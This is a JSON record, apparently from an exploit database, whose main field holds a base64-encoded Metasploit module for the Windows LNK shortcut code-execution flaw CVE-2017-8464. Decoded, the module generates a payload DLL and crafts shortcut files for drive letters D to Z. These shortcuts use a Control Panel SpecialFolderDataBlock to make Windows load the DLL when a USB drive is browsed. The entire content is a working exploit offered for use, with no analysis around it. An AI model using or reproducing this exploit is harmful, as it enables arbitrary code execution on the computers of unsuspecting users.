{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCiAgUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RVhFDQoNCiAgYXR0cl9hY2Nlc3NvciA6ZXhwbG9pdF9kbGxfbmFtZQ0KDQogIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICAgPT4gJ0xOSyBSZW1vdGUgQ29kZSBFeGVjdXRpb24gVnVsbmVyYWJpbGl0eScsDQogICAgICAnRGVzY3JpcHRpb24nICAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSB2dWxuZXJhYmlsaXR5IGluIHRoZSBoYW5kbGluZyBvZiBXaW5kb3dzIFNob3J0Y3V0IGZpbGVzICguTE5LKQ0KICAgICAgICB0aGF0IGNvbnRhaW4gYSBkeW5hbWljIGljb24sIGxvYWRlZCBmcm9tIGEgbWFsaWNpb3VzIERMTC4NCg0KICAgICAgICBUaGlzIHZ1bG5lcmFiaWxpdHkgaXMgYSB2YXJpYW50IG9mIE1TMTUtMDIwIChDVkUtMjAxNS0wMDk2KS4gVGhlIGNyZWF0ZWQgTE5LIGZpbGUgaXMNCiAgICAgICAgc2ltaWxhciBleGNlcHQgaW4gYW4gYWRkaXRpb25hbCBTcGVjaWFsRm9sZGVyRGF0YUJsb2NrIGlzIGluY2x1ZGVkLiBUaGUgZm9sZGVyIElEIHNldA0KICAgICAgICBpbiB0aGlzIFNwZWNpYWxGb2xkZXJEYXRhQmxvY2sgaXMgc2V0IHRvIHRoZSBDb250cm9sIFBhbmVsLiBUaGlzIGlzIGVub3VnaHQgdG8gYnlwYXNzDQogICAgICAgIHRoZSBDUEwgd2hpdGVsaXN0LiBUaGlzIGJ5cGFzcyBjYW4gYmUgdXNlZCB0byB0cmljayBXaW5kb3dzIGludG8gbG9hZGluZyBhbiBhcmJpdHJhcnkNCiAgICAgICAgRExMIGZpbGUuDQogICAgICB9LA0KICAgICAgJ0F1dGhvcicgICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgICdVbmNyZWRpdGVkJywgICAjIHZ1bG5lcmFiaWxpdHkgZGlzY292ZXJ5DQogICAgICAgICAgJ1lvcmljayBLb3N0ZXInICMgbXNmIG1vZHVsZQ0KICAgICAgICBdLA0KICAgICAgJ0xpY2Vuc2UnICAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnUmVmZXJlbmNlcycgICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydDVkUnLCAnMjAxNy04NDY0J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE3LTg0NjQnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwOi8vcGFwZXIuc2VlYnVnLm9yZy8zNTcvJ10sICMgd3JpdGV1cA0KICAgICAgICAgIFsnVVJMJywgJ2h0dHA6Ly93d3cudnhqdW1wLm5ldC9maWxlcy92dWxuX2FuYWx5c2lzL2N2ZS0yMDE3LTg0NjQudHh0J10gIyB3cml0ZXVwDQogICAgICAgIF0sDQogICAgICAnRGVmYXVsdE9wdGlvbnMnICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ0VYSVRGVU5DJyAgICA9PiAncHJvY2VzcycsDQogICAgICAgIH0sDQogICAgICAnQXJjaCcgICAgICAgICAgICA9PiBbQVJDSF9YODYsIEFSQ0hfWDY0XSwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgID0+DQogICAgICAgIHsNCiAgICAgICAgICAnU3BhY2UnICAgICAgID0+IDIwNDgsDQogICAgICAgIH0sDQogICAgICAnUGxhdGZvcm0nICAgICAgICA9PiAnd2luJywNCiAgICAgICdUYXJnZXRzJyAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdXaW5kb3dzIHg2NCcsIHsgJ0FyY2gnID0+IEFSQ0hfWDY0IH0gXSwNCiAgICAgICAgICBbICdXaW5kb3dzIHg4NicsIHsgJ0FyY2gnID0+IEFSQ0hfWDg2IH0gXQ0KICAgICAgICBdLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnICA9PiAwLCAjIERlZmF1bHQgdGFyZ2V0IGlzIDY0LWJpdA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyAgPT4gJ0p1biAxMyAyMDE3JykpDQoNCiAgICByZWdpc3Rlcl9hZHZhbmNlZF9vcHRpb25zKA0KICAgICAgWw0KICAgICAgICBPcHRCb29sLm5ldygnRGlzYWJsZVBheWxvYWRIYW5kbGVyJywgW2ZhbHNlLCAnRGlzYWJsZSB0aGUgaGFuZGxlciBjb2RlIGZvciB0aGUgc2VsZWN0ZWQgcGF5bG9hZCcsIHRydWVdKQ0KICAgICAgXSkNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBkbGwgPSBnZW5lcmF0ZV9wYXlsb2FkX2RsbA0KICAgIGRsbF9uYW1lID0gIiN7cmFuZF90ZXh0X2FscGhhKDE2KX0uZGxsIg0KICAgIGRsbF9wYXRoID0gc3RvcmVfZmlsZShkbGwsIGRsbF9uYW1lKQ0KICAgIHByaW50X3N0YXR1cygiI3tkbGxfcGF0aH0gY3JlYXRlZCBjb3B5IGl0IHRvIHRoZSByb290IGZvbGRlciBvZiB0aGUgdGFyZ2V0IFVTQiBkcml2ZSIpDQoNCiAgICAjIEhBQ0sgdGhlIHZ1bG5lcmFiaWxpdHkgZG9lc24ndCBhcHBlYXIgdG8gd29yayB3aXRoIFVOQyBwYXRocw0KICAgICMgQ3JlYXRlIExOSyBmaWxlcyB0byBkaWZmZXJlbnQgZHJpdmVzIGluc3RlYWQNCiAgICAnREVGR0hJSktMTU5PUFFSU1RVVldYWVonLnNwbGl0KCIiKS5lYWNoIGRvIHxpfA0KICAgICAgbG5rID0gZ2VuZXJhdGVfbGluaygiI3tpfTpcXCN7ZGxsX25hbWV9IikNCiAgICAgIGxua19wYXRoID0gc3RvcmVfZmlsZShsbmssICIje3JhbmRfdGV4dF9hbHBoYSgxNil9XyN7aX0ubG5rIikNCiAgICAgIHByaW50X3N0YXR1cygiI3tsbmtfcGF0aH0gY3JlYXRlLCBjb3B5IHRvIHRoZSBVU0IgZHJpdmUgaWYgZHJpdmUgbGV0dGVyIGlzICN7aX0iKQ0KICAgIGVuZA0KICBlbmQNCg0KICBkZWYgZ2VuZXJhdGVfbGluayhwYXRoKQ0KICAgIHBhdGggPDwgIlx4MDAiDQogICAgZGlzcGxheV9uYW1lID0gIkZsYXNoIFBsYXllclx4MDAiICMgTE5LIERpc3BsYXkgTmFtZQ0KICAgIGNvbW1lbnQgPSAiXHgwMCINCg0KICAgICMgQ29udHJvbCBQYW5lbCBBcHBsZXQgSXRlbUlEIHdpdGggb3VyIERMTA0KICAgIGNwbF9hcHBsZXQgPSBbDQogICAgICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDZhLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCANCiAgICAgIDB4MDAsIDB4MDANCiAgICBdLnBhY2soJ0MqJykNCiAgICBjcGxfYXBwbGV0IDw8IFtwYXRoLmxlbmd0aF0ucGFjaygndicpDQogICAgY3BsX2FwcGxldCA8PCBbZGlzcGxheV9uYW1lLmxlbmd0aF0ucGFjaygndicpDQogICAgY3BsX2FwcGxldCA8PCBwYXRoLnVucGFjaygnQyonKS5wYWNrKCd2KicpDQogICAgY3BsX2FwcGxldCA8PCBkaXNwbGF5X25hbWUudW5wYWNrKCdDKicpLnBhY2soJ3YqJykNCiAgICBjcGxfYXBwbGV0IDw8IGNvbW1lbnQudW5wYWNrKCdDKicpLnBhY2soJ3YqJykNCg0KICAgICMgTGlua0hlYWRlcg0KICAgIHJldCA9IFsNCiAgICAgIDB4NGMsIDB4MDAsIDB4MDAsIDB4MDAsICMgSGVhZGVyU2l6ZSwgbXVzdCBiZSAweDAwMDAwMDRDDQogICAgICAweDAxLCAweDE0LCAweDAyLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweGMwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQ2LCAjIExpbmtDTFNJRCwgbXVzdCBiZSAwMDAyMTQwMS0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDYNCiAgICAgIDB4ODEsIDB4MDAsIDB4MDAsIDB4MDAsICMgTGlua0ZsYWdzIChIYXNMaW5rVGFyZ2V0SURMaXN0IHwgSXNVbmljb2RlKQ0KICAgICAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgIyBGaWxlQXR0cmlidXRlcw0KICAgICAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgIyBDcmVhdGlvblRpbWUNCiAgICAgIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsICMgQWNjZXNzVGltZQ0KICAgICAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgIyBXcml0ZVRpbWUNCiAgICAgIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsICMgRmlsZVNpemUNCiAgICAgIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsICMgSWNvbkluZGV4DQogICAgICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAjIFNob3dDb21tYW5kDQogICAgICAweDAwLCAweDAwLCAjIEhvdEtleQ0KICAgICAgMHgwMCwgMHgwMCwgIyBSZXNlcnZlZDENCiAgICAgIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsICMgUmVzZXJ2ZWQyDQogICAgICAweDAwLCAweDAwLCAweDAwLCAweDAwICAjIFJlc2VydmVkMw0KICAgIF0ucGFjaygnQyonKQ0KDQogICAgIyBJRExpc3QNCiAgICBpZGxpc3RfZGF0YSA9ICcnDQogICAgaWRsaXN0X2RhdGEgPDwgWzB4MTIgKyAyXS5wYWNrKCd2JykgIyBJdGVtSURTaXplDQogICAgaWRsaXN0X2RhdGEgPDwgWw0KICAgICAgIyBUaGlzIFBDDQogICAgICAweDFmLCAweDUwLCAweGUwLCAweDRmLCAweGQwLCAweDIwLCAweGVhLCAweDNhLCAweDY5LCAweDEwLCAweGEyLCAweGQ4LCAweDA4LCAweDAwLCAweDJiLCAweDMwLA0KICAgICAgMHgzMCwgMHg5ZA0KICAgIF0ucGFjaygnQyonKQ0KICAgIGlkbGlzdF9kYXRhIDw8IFsweDEyICsgMl0ucGFjaygndicpICMgSXRlbUlEU2l6ZQ0KICAgIGlkbGlzdF9kYXRhIDw8IFsNCiAgICAgICMgQWxsIENvbnRyb2wgUGFuZWwgSXRlbXMNCiAgICAgIDB4MmUsIDB4ODAsIDB4MjAsIDB4MjAsIDB4ZWMsIDB4MjEsIDB4ZWEsIDB4M2EsIDB4NjksIDB4MTAsIDB4YTIsIDB4ZGQsIDB4MDgsIDB4MDAsIDB4MmIsIDB4MzAsDQogICAgICAweDMwLCAweDlkDQogICAgXS5wYWNrKCdDKicpDQogICAgaWRsaXN0X2RhdGEgPDwgW2NwbF9hcHBsZXQubGVuZ3RoICsgMl0ucGFjaygndicpDQogICAgaWRsaXN0X2RhdGEgPDwgY3BsX2FwcGxldA0KICAgIGlkbGlzdF9kYXRhIDw8IFsweDAwXS5wYWNrKCd2JykgIyBUZXJtaW5hbElEDQoNCiAgICAjIExpbmtUYXJnZXRJRExpc3QNCiAgICByZXQgPDwgW2lkbGlzdF9kYXRhLmxlbmd0aF0ucGFjaygndicpICMgSURMaXN0U2l6ZQ0KICAgIHJldCA8PCBpZGxpc3RfZGF0YQ0KDQogICAgIyBFeHRyYURhdGENCiAgICAjIFNwZWNpYWxGb2xkZXJEYXRhQmxvY2sNCiAgICByZXQgPDwgWw0KICAgICAgMHgxMCwgMHgwMCwgMHgwMCwgMHgwMCwgIyBCbG9ja1NpemUNCiAgICAgIDB4MDUsIDB4MDAsIDB4MDAsIDB4QTAsICMgQmxvY2tTaWduYXR1cmUgMHhBMDAwMDAwNQ0KICAgICAgMHgwMywgMHgwMCwgMHgwMCwgMHgwMCwgIyBTcGVjaWFsRm9sZGVySUQgKENTSURMX0NPTlRST0xTIC0gTXkgQ29tcHV0ZXJcQ29udHJvbCBQYW5lbCkNCiAgICAgIDB4MjgsIDB4MDAsIDB4MDAsIDB4MDAgICMgT2Zmc2V0IGluIExpbmtUYXJnZXRJRExpc3QNCiAgICBdLnBhY2soJ0MqJykNCiAgICAjIFRlcm1pbmFsQmxvY2sNCiAgICByZXQgPDwgWzB4MDAsIDB4MDAsIDB4MDAsIDB4MDBdLnBhY2soJ1YnKQ0KICAgIHJldA0KICBlbmQNCg0KICAjIFN0b3JlIHRoZSBmaWxlIGluIHRoZSBNU0YgbG9jYWwgZGlyZWN0b3J5IChlZywgL3Jvb3QvLm1zZjQvbG9jYWwvKQ0KICBkZWYgc3RvcmVfZmlsZShkYXRhLCBmaWxlbmFtZSkNCiAgICBsdHlwZSA9ICJleHBsb2l0LmZpbGVmb3JtYXQuI3tzZWxmLnNob3J0bmFtZX0iDQoNCiAgICBpZiAhIDo6RmlsZS5kaXJlY3Rvcnk/KE1zZjo6Q29uZmlnLmxvY2FsX2RpcmVjdG9yeSkNCiAgICAgIEZpbGVVdGlscy5ta2Rpcl9wKE1zZjo6Q29uZmlnLmxvY2FsX2RpcmVjdG9yeSkNCiAgICBlbmQNCg0KICAgIGlmIGZpbGVuYW1lIGFuZCBub3QgZmlsZW5hbWUuZW1wdHk/DQogICAgICBpZiBmaWxlbmFtZSA9fiAvKC4qKVwuKC4qKS8NCiAgICAgICAgZXh0ID0gJDINCiAgICAgICAgZm5hbWUgPSAkMQ0KICAgICAgZWxzZQ0KICAgICAgICBmbmFtZSA9IGZpbGVuYW1lDQogICAgICBlbmQNCiAgICBlbHNlDQogICAgICBmbmFtZSA9ICJsb2NhbF8je1RpbWUubm93LnV0Yy50b19pfSINCiAgICBlbmQNCg0KICAgIGZuYW1lID0gOjpGaWxlLnNwbGl0KGZuYW1lKS5sYXN0DQoNCiAgICBmbmFtZS5nc3ViISgvW15hLXowLTlcLlxfXC1dKy9pLCAnJykNCiAgICBmbmFtZSA8PCAiLiN7ZXh0fSINCg0KICAgIHBhdGggPSBGaWxlLmpvaW4oIiN7TXNmOjpDb25maWcubG9jYWxfZGlyZWN0b3J5fS8iLCBmbmFtZSkNCiAgICBmdWxsX3BhdGggPSA6OkZpbGUuZXhwYW5kX3BhdGgocGF0aCkNCiAgICBGaWxlLm9wZW4oZnVsbF9wYXRoLCAid2IiKSB7IHxmZHwgZmQud3JpdGUoZGF0YSkgfQ0KDQogICAgZnVsbF9wYXRoLmR1cA0KICBlbmQNCmVuZA==", 
    "filename": "platforms/windows/local/42382.rb", 
    "id": "42382", 
    "cves": [
        "CVE-2015-0096", 
        "CVE-2017-8464"
    ]
}